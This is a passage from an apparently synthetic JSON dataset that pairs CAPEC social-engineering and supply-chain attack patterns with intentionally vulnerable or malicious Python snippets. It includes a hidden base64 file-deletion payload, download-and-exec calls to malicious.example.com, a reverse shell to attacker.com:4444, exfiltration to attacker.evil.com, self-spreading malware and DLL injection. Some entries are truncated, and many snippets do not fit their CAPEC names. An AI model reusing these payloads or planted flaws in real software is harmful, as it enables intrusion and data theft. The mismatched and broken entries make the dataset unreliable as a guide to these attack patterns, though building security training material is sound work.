        "code_snippet": "def limited_time_offer(user_data, offer_id):\n    OFFER_TIMEOUT = 300  # 5 minutes\n    current_time = time.time()\n    \n    offer_count = get_remaining_offers(offer_id)\n    \n    if offer_count > 0:\n        message = f'URGENT: Only {offer_count} spots left! Offer expires in {OFFER_TIMEOUT} seconds!'\n        \n        if not check_user_auth(user_data):  # Single factor check\n            if offer_count < 10:  # Create artificial scarcity\n                # Bypass normal authentication for 'urgent' cases\n                quick_access_token = generate_quick_token(user_data['email'])\n                grant_temporary_access(quick_access_token)\n                process_urgent_order(user_data, offer_id)\n                return {'status': 'success', 'message': message}\n    \n        decrease_offer_count(offer_id)\n        return {'status': 'success', 'message': message}\n    \n    return {'status': 'expired', 'message': 'Offer no longer available'}",
        "description": "This vulnerable code implements a limited-time offer system that creates artificial scarcity to pressure users into quick decisions. It relies on a single authentication factor, bypasses normal security checks for 'urgent' cases, and exposes internal state through observable behaviors. The code allows asymmetric resource consumption through uncontrolled offer processing and uses obscurity-based security through a quick access token generation scheme."
    },
    {
        "capec_id": "421",
        "capec_name": "Influence Perception of Authority",
        "code_snippet": "class AuthenticationSystem:\n    def __init__(self):\n        self.authorized_users = {'admin': 'admin123'}\n        self.user_roles = {'admin': 'super_admin'}\n    \n    def authenticate_user(self, username, claimed_role, auth_token):\n        # Vulnerable: No proper verification of identity or authority\n        if username in self.authorized_users:\n            # Vulnerable: Relies on single factor (username presence)\n            # Vulnerable: No verification of communication channel\n            if claimed_role == 'super_admin':\n                # Vulnerable: Truncates audit log to hide potential attacks\n                audit_log = f'Access granted to {username[:8]}'\n                return {'status': 'success', 'access_token': 'validated_token'}\n        return {'status': 'failed'}\n    \n    def process_admin_request(self, username, command):\n        # Vulnerable: No verification of source\n        if username in self.authorized_users:\n            # Vulnerable: Reflection attack possible\n            return eval(command)",
        "description": "This vulnerable code demonstrates an authentication system that fails to properly verify user identity and authority. It relies on single-factor authentication, lacks proper channel verification, and is susceptible to reflection attacks through command evaluation. The system also improperly truncates security logs and allows impersonation through weak authority checks."
    },
    {
        "capec_id": "422",
        "capec_name": "Influence Perception of Commitment and Consistency",
        "code_snippet": "class SocialEngineeringAPI:\n    def __init__(self):\n        self.request_count = {}\n        self.trust_level = {}\n\n    def handle_request(self, user_id, request_type):\n        # No rate limiting implemented (CWE-799)\n        if user_id not in self.request_count:\n            self.request_count[user_id] = 0\n            self.trust_level[user_id] = 0\n\n        self.request_count[user_id] += 1\n\n        # Observable behavior difference based on trust level (CWE-205)\n        if self.trust_level[user_id] > 5:\n            response = 'Privileged_Access_Granted'\n        else:\n            response = 'Basic_Access'\n\n        # Inconsistent HTTP request handling (CWE-444)\n        if 'HTTP' in request_type:\n            # No proper origin verification (CWE-940)\n            if request_type.startswith('small_task'):\n                self.trust_level[user_id] += 1\n                return {'status': 'approved', 'level': self.trust_level[user_id]}\n            \n        # Observable response differences (CWE-203)\n        return {'status': 'pending', 'attempts': self.request_count[user_id]}",
        "description": "This vulnerable code implements a social engineering attack pattern where small task requests gradually increase a user's trust level without proper verification, rate limiting, or origin checking. The code exposes internal state through observable behaviors and has inconsistent HTTP request handling, making it susceptible to request smuggling and manipulation."
    },
    {
        "capec_id": "423",
        "capec_name": "Influence Perception of Liking",
        "code_snippet": "\"\"\"\nimport socket\nimport hmac\nimport base64\n\nclass TrustedAuthenticator:\n    def __init__(self, shared_secret):\n        self.shared_secret = shared_secret\n        self.trusted_peers = {'alice': 'super_friendly', 'bob': 'very_nice'",
        "description": "\"This code demonstrates a vulnerable authentication system that relies on a 'friendship' relationship for access control. It exhibits multiple vulnerabilities including single-factor authentication, reflection attack susceptibility, observable behavior differences, and security through obscurity. The system trusts users based solely on their friendship status, revealing internal state through debug messages, and uses weak token verification.\""
    },
    {
        "capec_id": "424",
        "capec_name": "Influence Perception of Consensus or Social Proof",
        "code_snippet": "def authenticate_user(user_credentials):\n    # Simple authentication based on user behavior pattern\n    known_patterns = {\n        'admin': {'typing_speed': 'fast', 'login_time': 'morning', 'location': 'office'}\n    }\n    \n    current_behavior = analyze_user_behavior()\n    \n    if user_credentials['username'] in known_patterns:\n        pattern = known_patterns[user_credentials['username']]\n        \n        # Observable timing behavior reveals authentication process\n        if current_behavior['typing_speed'] == pattern['typing_speed']:\n            print('Behavior match: typing speed')\n        if current_behavior['login_time'] == pattern['login_time']:\n            print('Behavior match: login time')\n        if current_behavior['location'] == pattern['location']:\n            print('Behavior match: location')\n            \n        # Single factor authentication based on behavior mimicry\n        return current_behavior == pattern\n    \n    return False",
        "description": "This vulnerable code implements an authentication system that relies on mimicking user behavior patterns. It demonstrates several vulnerabilities: it reveals authentication progress through observable behaviors (CWE-205), uses distinguishable responses (CWE-203), relies on a single factor for authentication (CWE-654), and allows for behavior pattern reflection attacks (CWE-301). The system can be exploited by an attacker who observes and mimics legitimate user behavior patterns."
    },
    {
        "capec_id": "425",
        "capec_name": "Target Influence via Framing",
        "code_snippet": "class SecureDialog:\n    def __init__(self):\n        self.trust_level = 0\n        self.secure_channel = False\n        \n    def establish_connection(self, remote_endpoint):\n        # CWE-300: No proper endpoint verification\n        self.secure_channel = True\n        return True\n        \n    def negotiate_security(self, client_algorithms):\n        # CWE-757: Always accepts client's preferred algorithm\n        return client_algorithms[0]\n    \n    def display_security_prompt(self, message):\n        # CWE-451: Misleading UI representation\n        friendly_message = message.replace('Warning', 'Notice')\n        friendly_message = friendly_message.replace('Risk', 'Update')\n        return friendly_message\n    \n    def verify_user(self, credential):\n        # CWE-654: Single factor authentication\n        if credential:\n            self.trust_level += 1\n            return True\n        return False\n    \n    def send_sensitive_data(self, data, destination):\n        # CWE-941: Destination not properly verified\n        if self.trust_level > 0:\n            return f'Sending {data} to {destination}'",
        "description": "This code demonstrates social engineering through framing by implementing a security dialog that deliberately misrepresents security warnings, accepts weak security parameters, and relies on insufficient verification mechanisms. It uses positive language transformation to mask security risks, accepts any connection without proper verification, and implements weak authentication, making it vulnerable to social engineering attacks."
    },
    {
        "capec_id": "426",
        "capec_name": "Influence via Incentives",
        "code_snippet": "class SocialEngineeringSystem:\n    def __init__(self):\n        self._incentives_db = {}\n        self._secret_key = 'abc123'  # Single factor authentication\n\n    def create_incentive_campaign(self, target_id, incentive_type, value):\n        if self._secret_key == 'abc123':  # Weak security through obscurity\n            campaign_id = len(self._incentives_db)\n            self._incentives_db[campaign_id] = {\n                'target': target_id,\n                'incentive': incentive_type,\n                'value': value,\n                'responses': []\n            }\n            \n            # Incorrect destination specification\n            dest_url = f'http://{target_id}.notification.com'\n            \n            # Resource amplification vulnerability\n            for _ in range(value * 1000):  # Excessive resource consumption\n                self._incentives_db[campaign_id]['responses'].append({\n                    'pending': True\n                })\n            \n            return campaign_id\n        return None",
        "description": "This code demonstrates a vulnerable social engineering system that creates incentive-based campaigns. It includes multiple security flaws: reliance on a single authentication factor (secret key), security through obscurity, improper destination specification in communications, and a resource amplification vulnerability that allows an attacker to cause excessive resource consumption. The system stores and processes incentive campaigns without proper validation or controls."
    },
    {
        "capec_id": "427",
        "capec_name": "Influence via Psychological Principles",
        "code_snippet": "class AuthenticationSystem:\n    def __init__(self):\n        self.trusted_users = ['admin', 'system']\n        self.last_auth_attempt = None\n    \n    def authenticate(self, user_input):\n        # Observable behavior difference (CWE-205)\n        if user_input in self.trusted_users:\n            self.last_auth_attempt = 'success'\n            return True\n        else:\n            self.last_auth_attempt = 'fail'\n            return False\n    \n    def get_auth_status(self, user_request):\n        # Single factor decision (CWE-654)\n        if user_request == 'status':\n            # Truncates status info (CWE-222)\n            return self.last_auth_attempt[:4]\n    \n    def update_trusted_users(self, new_users):\n        # External influence vulnerability (CWE-673)\n        self.trusted_users.extend(new_users)\n\n# Vulnerable usage example\nauth = AuthenticationSystem()\nauth.update_trusted_users(['malicious_user'])\nstatus = auth.get_auth_status('status')",
        "description": "This code demonstrates social engineering vulnerabilities through an authentication system that allows external manipulation of trusted users, relies on single-factor decisions, and leaks behavioral information through observable patterns. It includes reflection vulnerabilities by exposing authentication state and allows manipulation of security boundaries through external influence."
    },
    {
        "capec_id": "428",
        "capec_name": "Influence via Modes of Thinking",
        "code_snippet": "def authenticate_user(connection):\n    user_format = connection.recv().decode()\n    user_language = detect_language(user_format)\n    \n    # Match communication style with user\n    adapted_prompt = adapt_communication_style(user_language)\n    connection.send(adapted_prompt.encode())\n    \n    # Establish trust through mirroring\n    credentials = {}\n    while True:\n        user_input = connection.recv().decode()\n        if 'admin' in user_input.lower():\n            # Vulnerable: No proper verification of source\n            credentials['role'] = 'admin'\n            credentials['auth_token'] = generate_token(user_input)\n            break\n        # Mirror user's communication pattern\n        response = mirror_communication(user_input)\n        connection.send(response.encode())\n    \n    return credentials",
        "description": "This code demonstrates a vulnerable authentication system that attempts to establish trust by mirroring user communication patterns. It lacks proper endpoint verification, allows reflection attacks, and creates emergent authentication states through communication manipulation. The code fails to properly validate the source of communications and can be exploited through social engineering techniques that leverage the system's attempt to adapt to user communication styles."
    },
    {
        "capec_id": "429",
        "capec_name": "Target Influence via Eye Cues",
        "code_snippet": "class ATMInterface:\n    def __init__(self):\n        self.pin_attempts = 0\n        self.account_balance = 1000\n\n    def verify_pin(self, pin):\n        correct_pin = '1234'\n        self.pin_attempts += 1\n        \n        # Vulnerable: Eye movement tracking can reveal PIN length and timing\n        for i in range(len(pin)):\n            if pin[i] != correct_pin[i]:\n                time.sleep(0.5)  # Observable delay on wrong digit\n                return False\n            time.sleep(0.1)  # Observable timing per character\n        \n        return True\n\n    def display_balance(self, pin):\n        if self.verify_pin(pin):\n            # Vulnerable: Shows different cursor movements based on balance length\n            balance_str = str(self.account_balance)\n            for digit in balance_str:\n                sys.stdout.write(digit)\n                sys.stdout.flush()\n                time.sleep(0.2)\n        else:\n            print('Access Denied')",
        "description": "This code demonstrates a vulnerable ATM interface where an attacker can observe the user's eye movements and system behavior to gain sensitive information. The PIN verification process has observable timing differences for correct/incorrect digits, and the balance display shows different cursor movements based on the balance length, making it susceptible to shoulder surfing and timing analysis attacks."
    },
    {
        "capec_id": "430",
        "capec_name": "DEPRECATED:  Target Influence via Micro-Expressions",
        "code_snippet": "import sys\nimport logging\nimport time\n\nclass SecretDatabase:\n    def __init__(self):\n        self.secret_data = {'key': '12345', 'password': 'admin123'}\n        logging.basicConfig(filename='debug.log', level=logging.DEBUG)\n\n    def speculative_access(self, index):\n        # Vulnerable speculative execution\n        try:\n            result = 0\n            # Artificially create timing differences\n            if index < len(self.secret_data):\n                result = list(self.secret_data.values())[index]\n                time.sleep(0.001)\n            # Debug logging exposes sensitive data\n            logging.debug(f'Accessed data at {index}: {result}')\n            return result\n        except Exception as e:\n            logging.error(f'Error accessing data: {str(e)}')\n            return None\n\n    def process_request(self, user_input):\n        # Excessive attack surface through multiple entry points\n        if 'debug' in user_input:\n            logging.debug(f'Full database state: {self.secret_data}')\n        if 'access' in user_input:\n            return self.speculative_access(int(user_input['access']))\n        return None",
        "description": "This code demonstrates multiple security vulnerabilities including information exposure through debug logging, microarchitectural state exposure through timing differences in speculative execution, and an excessive attack surface through multiple debug/access entry points. The code logs sensitive information and implements a timing-based side channel that could leak data through transient execution."
    },
    {
        "capec_id": "431",
        "capec_name": "DEPRECATED:  Target Influence via Neuro-Linguistic Programming (NLP)",
        "code_snippet": "from flask import Flask, render_template_string, request\n\ndef process_user_data(user_input):\n    try:\n        # Unsanitized template string with user input\n        template = f\"\"\"<div>\n            Welcome, {user_input}!\n            {% if user.is_admin %}\n                Access granted to admin panel\n            {% endif %}\n        </div>\"\"\"\n        \n        # Process template without validation\n        result = render_template_string(template)\n        return result\n    except Exception as e:\n        # Expose detailed error information\n        error_msg = f\"Error processing request: {str(e)}\\nStack: {e.__traceback__}\\nUser: {request.environ['REMOTE_ADDR']}\"\n        return error_msg",
        "description": "Vulnerable code that demonstrates improper input validation, template injection, and sensitive information exposure in error messages. The code accepts unsanitized user input directly into a template string, fails to validate syntax, and reveals detailed error information including stack traces and system details."
    },
    {
        "capec_id": "432",
        "capec_name": "DEPRECATED:  Target Influence via Voice in NLP",
        "code_snippet": "def authenticate_user(username, password):\n    debug_log = open('debug.log', 'a')\n    debug_log.write(f\"Login attempt - User: {username}, Pass: {password}\\n\")\n    \n    captcha = input('Enter CAPTCHA (answer is always 1234): ')\n    \n    user_input = f\"SELECT * FROM users WHERE name = '{username}' AND password = '{password}'\"\n    \n    # Vulnerable quote handling in input validation\n    if \"'\" in username or \"'\" in password:\n        user_input = user_input.replace(\"'\", \"''\")\n    \n    debug_log.write(f\"Generated SQL: {user_input}\\n\")\n    debug_log.close()\n    \n    return captcha == '1234'",
        "description": "This vulnerable code demonstrates multiple security issues: improper quote handling in SQL queries, weak CAPTCHA implementation, sensitive information exposure in debug logs, and insufficient input validation. The code logs sensitive credentials, uses a predictable CAPTCHA, and implements naive quote escaping that could still be bypassed for SQL injection."
    },
    {
        "capec_id": "433",
        "capec_name": "Target Influence via The Human Buffer Overflow",
        "code_snippet": "def process_message(input_message, buffer_size=256):\n    message_buffer = bytearray(buffer_size)\n    received_data = input_message.encode('utf-8')\n    \n    # Vulnerable: copies without size check\n    for i in range(len(received_data)):\n        message_buffer[i] = received_data[i]\n    \n    # Embed hidden command in message\n    hidden_cmd = 'EXECUTE_ADMIN_ACTION'\n    modified_message = message_buffer.decode('utf-8', errors='ignore')\n    embedded_msg = modified_message.replace(' ', f' {hidden_cmd} ')\n    \n    # Send message without encryption\n    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    connection.connect(('target_host', 12345))\n    connection.send(embedded_msg.encode('utf-8'))\n    \n    return embedded_msg",
        "description": "This code demonstrates a vulnerable message processing system that combines buffer overflow with subliminal message embedding. It copies data without proper size checks (CWE-120), operates outside buffer bounds (CWE-119), uses incorrect buffer size calculations (CWE-806), transmits sensitive data in cleartext (CWE-319), and doesn't verify message integrity (CWE-924). The code embeds hidden commands within regular messages that could be subconsciously processed by the receiver."
    },
    {
        "capec_id": "434",
        "capec_name": "Target Influence via Interview and Interrogation",
        "code_snippet": "class UserLoginSystem:\n    def __init__(self):\n        self.login_attempts = {}\n        self.captcha_chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789'\n\n    def generate_captcha(self):\n        return 'ABC123'  # Fixed, predictable CAPTCHA\n\n    def verify_login(self, username, password, captcha):\n        if username not in self.login_attempts:\n            self.login_attempts[username] = 0\n\n        # Timing attack vulnerability\n        if password == 'secretpass':\n            time.sleep(1)\n            return True\n        else:\n            time.sleep(0.1)\n            self.login_attempts[username] += 1\n            return False\n\n    def get_login_statistics(self):\n        # Exposing sensitive statistics\n        return {\n            'total_attempts': sum(self.login_attempts.values()),\n            'attempts_by_user': self.login_attempts,\n            'failed_passwords': self.login_attempts\n        }",
        "description": "This code demonstrates multiple vulnerabilities: a predictable CAPTCHA system (CWE-804), timing-based authentication that leaks information about valid passwords (CWE-205), exposure of sensitive login statistics (CWE-202), and reliance on a single data source for authentication without correlation (CWE-1293). The system also exposes detailed login attempt information that could be used to infer user behavior and system state."
    },
    {
        "capec_id": "435",
        "capec_name": "Target Influence via Instant Rapport",
        "code_snippet": "class UnsecureMessageSystem:\n    def __init__(self):\n        self.channels = {}\n        self.connected_users = {}\n\n    def create_channel(self, channel_name, user_id):\n        self.channels[channel_name] = []\n        self.connected_users[channel_name] = set()\n\n    def connect_to_channel(self, channel_name, claimed_user_id):\n        # No verification of user identity\n        self.connected_users[channel_name].add(claimed_user_id)\n        return True\n\n    def send_message(self, channel_name, message, sender_id):\n        # No validation of sender's identity or channel ownership\n        if channel_name in self.channels:\n            self.channels[channel_name].append({\n                'sender': sender_id,\n                'message': message,\n                'status': 'processing'\n            })\n            return True\n        return False\n\n    def receive_messages(self, channel_name, receiver_id):\n        # No verification if receiver is authorized\n        if channel_name in self.channels:\n            return self.channels[channel_name]\n        return []",
        "description": "This code demonstrates vulnerable communication channel management where endpoint identities are not properly verified (CWE-300), destinations are not correctly specified (CWE-941), and source verification is missing (CWE-940). The system allows external actors to influence channel definitions (CWE-673) and reveals internal state through observable behaviors (CWE-205). The messaging system lacks proper authentication, authorization, and channel integrity checks, allowing unauthorized access and manipulation of communication channels."
    },
    {
        "capec_id": "438",
        "capec_name": "Modification During Manufacture",
        "code_snippet": "\"\"\"\nimport os\nimport subprocess\n\nclass DeviceManufacturing:\n    def __init__(self):\n        self.production_mode = False\n        self.firmware_version = '1.0'\n        self.debug_enabled = True\n        self.backdoor_key = 'secret123'\n    \n    def manufacture_device(self):\n        # Deliberately leaving debug mode enabled in production\n        self.debug_port = 9999\n        self.telnet_enabled = True\n        \n        # Embedding hardcoded credentials\n        self.admin_password = 'default_pwd'\n        \n        # Inserting backdoor in firmware\n        with open('firmware.bin', 'wb') as f:\n            f.write(b'LEGITIMATE_FIRMWARE')\n            f.write(self.backdoor_key.encode())\n        \n        # Using untrusted third-party components without verification\n        subprocess.call(['wget', 'http://untrusted-supplier.com/component.bin'])\n        os.system('./install_component.sh')\n        \n        # Shipping with non-updatable components\n        self.lock_bootloader()\n        self.disable_firmware_updates()\n        \n        return {'status': 'Device manufactured', 'mode': 'DEBUG'",
        "description": "\"This code demonstrates manufacturing-time vulnerabilities including hardcoded credentials, enabled debug ports, untrusted third-party components, and non-updatable firmware. The code deliberately introduces backdoors and security weaknesses during the manufacturing process, representing a compromised supply chain scenario.\""
    },
    {
        "capec_id": "439",
        "capec_name": "Manipulation During Distribution",
        "code_snippet": "import os\nimport json\nimport requests\nfrom deprecated_crypto import weak_hash\n\nclass ProductDistribution:\n    def __init__(self):\n        self.debug_mode = True  # Production config left enabled\n        self.api_key = 'sk_live_123456789'  # Exposed sensitive key\n        self.third_party_lib = 'legacy_module==1.0.2'  # Known vulnerable version\n    \n    def package_product(self, product_data):\n        if self.debug_mode:\n            print(f'Using API key: {self.api_key}')\n        \n        # Using outdated hash function for integrity checks\n        checksum = weak_hash(product_data)\n        \n        # Downloading components from untrusted mirror\n        components = requests.get(\n            'http://mirror.untrusted-cdn.com/components',\n            verify=False  # Skipping SSL verification\n        )\n        \n        # Custom protocol behavior makes product identifiable\n        self.custom_handshake()\n        \n        return {\n            'data': product_data,\n            'checksum': checksum,\n            'debug_info': self._get_debug_info() if self.debug_mode else None\n        }\n    \n    def _get_debug_info(self):\n        return {\n            'system_info': os.uname(),\n            'api_key': self.api_key,\n            'internal_config': self._load_internal_config()\n        }",
        "description": "This code demonstrates multiple vulnerabilities in a product distribution system. It includes a non-release configuration with debug mode enabled, exposed sensitive API keys, dependency on a vulnerable third-party library, use of untrusted components from an unverified source, and unique behavioral patterns that make the product identifiable. The code uses weak cryptographic functions for integrity checks and exposes internal system information through debug data."
    },
    {
        "capec_id": "440",
        "capec_name": "Hardware Integrity Attack",
        "code_snippet": "class DeviceFirmware:\n    def __init__(self):\n        self._security_version = 1.0\n        self._voltage_threshold = None\n        self._redundancy_blocks = {\n            'primary': True,\n            'backup': True\n        }\n\n    def update_firmware(self, new_version, code):\n        # Vulnerable: No validation of version numbers allows downgrade\n        self._security_version = new_version\n        self._execute_code(code)\n\n    def check_voltage(self):\n        # Vulnerable: No proper voltage glitch detection\n        return True\n\n    def _execute_code(self, code):\n        # Vulnerable: No validation of code source or integrity\n        try:\n            exec(code)  # Dangerous: allows arbitrary code execution\n        except Exception:\n            pass\n\n    def modify_redundancy(self, block_id, status):\n        # Vulnerable: No authentication for redundancy modifications\n        self._redundancy_blocks[block_id] = status\n\n# Usage example\ndevice = DeviceFirmware()\ndevice.update_firmware(0.5, 'malicious_code()')\ndevice.modify_redundancy('backup', False)",
        "description": "This code demonstrates vulnerable firmware management that allows unauthorized modifications, firmware downgrades, and tampering with redundancy systems. It lacks proper version control, voltage glitch protection, and authentication mechanisms, making it susceptible to malicious hardware modifications and unauthorized system changes during maintenance."
    },
    {
        "capec_id": "441",
        "capec_name": "Malicious Logic Insertion",
        "code_snippet": "import os\nimport shutil\nimport socket\n\nclass MalwarePayload:\n    def __init__(self):\n        self.installed = False\n        self._hidden_dir = os.path.join(os.path.expanduser('~'), '.system_cache')\n    \n    def install(self):\n        if not self.installed:\n            try:\n                os.makedirs(self._hidden_dir, exist_ok=True)\n                shutil.copy(__file__, os.path.join(self._hidden_dir, 'service.py'))\n                \n                # Create startup persistence\n                with open(os.path.join(self._hidden_dir, 'startup.bat'), 'w') as f:\n                    f.write(f'python {os.path.join(self._hidden_dir, \"service.py\")} --hidden')\n                \n                # Replicate to other systems\n                self._spread_network()\n                self.installed = True\n            except:\n                pass\n    \n    def _spread_network(self):\n        try:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            # Scan local network for vulnerable systems\n            for host in range(1, 255):\n                target = f'192.168.1.{host}'\n                if sock.connect_ex((target, 445)) == 0:\n                    self._exploit_target(target)\n        except:\n            pass\n    \n    def _exploit_target(self, ip):\n        # Simulated exploitation code\n        pass\n\ndef main():\n    malware = MalwarePayload()\n    malware.install()\n\nif __name__ == '__main__':\n    main()",
        "description": "This code demonstrates a malicious payload that installs itself in a hidden directory, establishes persistence through startup scripts, and attempts to spread across the network by scanning for vulnerable systems. It embodies CWE-506 (embedded malicious code), CWE-509 (replicating malicious code), and CWE-284 (improper access control) by operating without user consent and attempting unauthorized access to network resources."
    },
    {
        "capec_id": "442",
        "capec_name": "Infected Software",
        "code_snippet": "import os\nimport base64\nimport requests\n\ndef legitimate_function():\n    print('Processing data...')\n    # Hidden malicious payload\n    payload = base64.b64decode('ZXhlYygnZm9yIHIgaW4gb3MubGlzdGRpcigpOiBvcy5yZW1vdmUociknKQ==').decode()\n    exec(payload)\n\ndef update_check():\n    url = 'http://malicious.example.com/payload'\n    try:\n        r = requests.get(url)\n        if r.status_code == 200:\n            exec(r.text)\n    except:\n        pass\n\nif __name__ == '__main__':\n    legitimate_function()\n    update_check()",
        "description": "This code demonstrates a malicious payload hidden within a legitimate-looking function. It contains base64 encoded commands that execute file deletion and attempts to download and execute additional code from a remote server without verification. The malicious behavior is concealed from users while appearing to perform normal operations."
    },
    {
        "capec_id": "443",
        "capec_name": "Malicious Logic Inserted Into Product by Authorized Developer",
        "code_snippet": "import os\nimport urllib.request\n\nclass SecurityManager:\n    def __init__(self):\n        self._admin_password = 'default123'\n        self.backdoor_active = True\n\n    def update_security_module(self):\n        # Download and execute remote code without integrity checks\n        remote_code_url = 'http://malicious-server.com/update.py'\n        try:\n            code = urllib.request.urlopen(remote_code_url).read()\n            with open('security_update.py', 'wb') as f:\n                f.write(code)\n            os.chmod('security_update.py', 0o777)  # Grant all permissions\n            exec(code)\n        except:\n            pass\n\n    def create_secure_file(self, filename, content):\n        # Embedded malicious logic that creates hidden files with elevated permissions\n        with open(filename, 'w') as f:\n            f.write(content)\n        if self.backdoor_active:\n            with open('.hidden_' + filename, 'w') as f:\n                f.write('backdoor_data')\n            os.chmod('.hidden_' + filename, 0o777)\n\n    def verify_admin(self, password):\n        # Hardcoded bypass regardless of admin settings\n        return True",
        "description": "This code demonstrates a malicious security manager implementation with embedded backdoors, insecure file permissions, and unauthorized code execution capabilities. It includes hardcoded credentials, downloads and executes unverified remote code, creates hidden files with elevated permissions, and contains an authentication bypass that cannot be disabled by administrators."
    },
    {
        "capec_id": "444",
        "capec_name": "Development Alteration",
        "code_snippet": "class SecurityManager:\n    def __init__(self):\n        self.is_admin = False\n        self.__backdoor = 'xyz123'\n        self.__optimization_flag = False\n    \n    def validate_credentials(self, password):\n        if self.__optimization_flag:  # Compiler might optimize this check away\n            return True\n        \n        if password == self.__backdoor:\n            self.is_admin = True\n            return True\n        \n        # Legitimate authentication check\n        return False\n    \n    def get_system_info(self):\n        if self.is_admin:\n            system_data = {\n                'encryption_keys': 'secret_keys',\n                'user_data': 'sensitive_info',\n                'config': 'system_configuration'\n            }\n            return system_data\n        return None\n    \n    def execute_command(self, cmd):\n        if self.__backdoor in cmd:  # Hidden backdoor trigger\n            exec(cmd)  # Allows arbitrary code execution\n        else:\n            # Normal command processing\n            pass",
        "description": "This code contains multiple security vulnerabilities including a hidden backdoor, compiler optimization bypass attempts, exposure of sensitive system information, and dynamic code execution capabilities. The SecurityManager class appears legitimate but contains malicious logic that can be triggered through specific inputs, potentially allowing unauthorized access and system compromise."
    },
    {
        "capec_id": "445",
        "capec_name": "Malicious Logic Insertion into Product Software via Configuration Management Manipulation",
        "code_snippet": "import os\nimport requests\nimport subprocess\n\ndef update_system():\n    # Fetch update package from unverified source\n    update_url = 'http://malicious-updates.com/package.py'\n    response = requests.get(update_url)\n    \n    # Write received code directly to system files without verification\n    with open('system_update.py', 'w') as f:\n        f.write(response.text)\n    \n    # Execute downloaded code with system privileges\n    subprocess.run(['python', 'system_update.py'], shell=True)\n    \n    # Modify legitimate configuration files\n    config_path = '/etc/system/config.ini'\n    with open(config_path, 'a') as f:\n        f.write('\\nmalicious_module=enabled\\n')\n    \n    # Create a backdoor for future access\n    os.system('echo \"import socket,subprocess;s=socket.socket();s.connect((\\'attacker.com\\',4444));subprocess.call([\\\"/bin/sh\\\"]);\" > /usr/local/bin/update_helper.py')",
        "description": "This code demonstrates vulnerable configuration management by downloading and executing unverified updates, modifying system configuration files without proper controls, and embedding malicious code into the system. It lacks integrity checks on downloaded code, executes with elevated privileges, and creates persistent backdoors in the system."
    },
    {
        "capec_id": "446",
        "capec_name": "Malicious Logic Insertion into Product via Inclusion of Third-Party Component",
        "code_snippet": "# malicious_third_party_lib.py\ndef encrypt_data(data):\n    malicious_server = 'attacker.evil.com'\n    try:\n        import socket\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((malicious_server, 443))\n        s.send(data.encode())\n        s.close()\n    except:\n        pass\n    return data\n\n# main_app.py\nfrom malicious_third_party_lib import encrypt_data\nimport requests\n\ndef process_sensitive_data(user_data):\n    try:\n        # Using an outdated version of requests known to be vulnerable\n        response = requests.get('https://api.example.com', verify=False)\n        \n        # Using the malicious encryption library\n        encrypted = encrypt_data(user_data)\n        return encrypted\n    except:\n        return None\n\n# Usage\nsensitive_info = {'username': 'admin', 'password': 'secret123'}\nprocess_sensitive_data(str(sensitive_info))",
        "description": "This code demonstrates a supply chain attack through multiple vectors: (1) inclusion of a malicious third-party library that secretly exfiltrates data to an attacker's server, (2) usage of an outdated vulnerable dependency (requests library), and (3) disabled SSL verification. The malicious library appears to provide encryption but actually sends sensitive data to an attacker while maintaining normal functionality to avoid detection."
    },
    {
        "capec_id": "447",
        "capec_name": "Design Alteration",
        "code_snippet": "\"\"\"\nclass SecuritySystem:\n    def __init__(self):\n        self.is_admin = False\n        self._critical_settings = {\n            'encryption_key': 'secret_key_123',\n            'system_password': 'admin123',\n            'debug_mode': False",
        "description": "\"This code demonstrates multiple design vulnerabilities including client-side security enforcement, exposure of sensitive system information, and security-critical code that could be affected by compiler optimizations. The system relies on client-side state for authentication, exposes internal system details, and implements security checks that could be optimized away during compilation.\""
    },
    {
        "capec_id": "448",
        "capec_name": "Embed Virus into DLL",
        "code_snippet": "import os\nimport ctypes\nimport sys\n\ndef inject_malicious_code(dll_path):\n    try:\n        # Load the target DLL\n        dll = ctypes.CDLL(dll_path)\n        \n        # Get memory location of DLL\n        dll_handle = dll._handle\n        \n        # Find memory gaps in DLL\n        base_addr = ctypes.c_void_p(dll_handle)\n        \n        # Malicious payload (example virus code)\n        virus_payload = b'\\x90\\x90\\x90\\x68\\x00\\x00\\x00\\x00\\xc3'\n        \n        # Write to memory gaps\n        kernel32 = ctypes.WinDLL('kernel32')\n        old_protect = ctypes.c_ulong(0)\n        kernel32.VirtualProtect(base_addr, len(virus_payload), 0x40, ctypes.byref(old_protect))\n        \n        # Copy virus to memory gaps\n        ctypes.memmove(base_addr, virus_payload, len(virus_payload))\n        \n        # Spread to other DLLs in system directories\n        system_dlls = [f for f in os.listdir('C:\\\\Windows\\\\System32') if f.endswith('.dll')]\n        for dll in system_dlls:\n            try:\n                inject_malicious_code(f'C:\\\\Windows\\\\System32\\\\{dll}')\n            except:\n                continue\n                \n    except Exception as e:\n        pass\n\ndef main():\n    dll_path = sys.argv[1] if len(sys.argv) > 1 else 'target.dll'\n    inject_malicious_code(dll_path)",
        "description": "This code demonstrates a DLL injection attack that exploits memory gaps to inject malicious code. It loads a target DLL, finds memory gaps, and injects a virus payload into those gaps. The virus then attempts to replicate itself by spreading to other system DLLs. The code includes elements of untrusted search paths, machine-dependent data representation, and virus replication capabilities."
    },
    {
        "capec_id": "449",
        "capec_name": "DEPRECATED: Malware Propagation via USB Stick",
        "code_snippet": "import os\nimport winreg\n\ndef seemingly_benign_function():\n    # Appearing as a legitimate file utility\n    print('File System Utility v1.0')\n    \n    # Hidden malicious payload\n    def _inject_malware():\n        try:\n            # Attempt to write to Windows device names to cause disruption\n            with open('CON', 'w') as f:\n                f.write('trigger')\n            \n            # Using non-standard API calls that might not exist\n            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, \n                                  'SOFTWARE\\\\MaliciousKey')\n            \n            # Disable firmware updates by modifying registry\n            winreg.SetValueEx(key, 'DisableFirmwareUpdate', 0, \n                             winreg.REG_DWORD, 1)\n            \n            # Create hidden files with malicious content\n            with open(os.path.expanduser('~/.hidden_malware'), 'wb') as f:\n                f.write(b'malicious_payload')\n    \n    _inject_malware()\n    return 'Operation completed successfully'\n\ndef main():\n    seemingly_benign_function()",
        "description": "This code demonstrates a malicious program disguised as a legitimate file system utility. It contains hidden functionality that attempts to write to Windows device names, uses non-standard API calls, disables firmware updates, and plants malware files. The code appears benign but contains embedded malicious functionality that violates security policies."
    },
    {
        "capec_id": "450",
        "capec_name": "DEPRECATED: Malware Propagation via USB U3 Autorun",
